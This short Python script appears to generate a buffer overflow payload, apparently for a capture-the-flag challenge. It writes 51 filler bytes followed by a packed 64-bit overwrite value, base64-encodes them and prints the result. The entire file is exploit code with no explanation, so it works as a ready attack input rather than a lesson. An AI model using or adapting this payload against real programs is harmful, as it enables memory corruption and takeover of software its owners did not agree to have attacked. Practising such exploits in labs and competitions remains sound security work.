
import sys
import struct
import base64

buf = b'ooooooooooooooooooooooooooooooooooooooooooooooooooo'
buf += struct.pack('<Q', 5413910253635143003)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
